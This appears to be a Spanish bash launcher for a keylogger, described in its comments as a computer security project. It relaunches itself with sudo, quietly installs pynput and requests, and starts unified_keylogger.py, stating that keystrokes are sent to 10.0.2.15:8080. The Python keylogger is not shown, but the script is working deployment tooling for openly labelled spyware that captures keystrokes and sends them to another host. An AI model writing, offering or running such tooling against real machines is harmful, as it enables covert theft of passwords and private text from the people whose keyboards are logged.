#!/bin/bash
# keylogger automático - ejecutable con doble clic
# proyecto de seguridad informática

clear
echo "🚀 KEYLOGGER AUTOMÁTICO"
echo "======================="
echo ""

# verificar si estamos en el directorio correcto
if [ ! -f "unified_keylogger.py" ]; then
    echo "❌ Error: No se encontró unified_keylogger.py"
    echo "Ejecuta este script desde el directorio del proyecto"
    read -p "Presiona Enter para salir..."
    exit 1
fi

# verificar si somos root (necesario para keylogger)
if [ "$EUID" -ne 0 ]; then
    echo "🔑 Necesitas permisos de administrador"
    echo "Relanzando con sudo..."
    exec sudo "$0" "$@"
fi

echo "✅ Permisos correctos"
echo "📦 Verificando dependencias..."

# verificar python3
if ! command -v python3 &> /dev/null; then
    echo "❌ Python3 no está instalado"
    apt update && apt install -y python3
fi

# verificar e instalar dependencias
echo "📥 Instalando dependencias..."
apt update > /dev/null 2>&1
apt install -y python3-pynput python3-requests > /dev/null 2>&1

if [ $? -eq 0 ]; then
    echo "✅ Dependencias instaladas"
else
    echo "⚠️ Error instalando dependencias, continuando..."
fi

echo ""
echo "🎯 INICIANDO KEYLOGGER..."
echo "🎯 Configurado para enviar a: 10.0.2.15:8080"
echo "🚨 Presiona Ctrl+C para detener"
echo ""

# iniciar el keylogger
python3 unified_keylogger.py

echo ""
echo "👋 Keylogger detenido"
read -p "Presiona Enter para salir..."
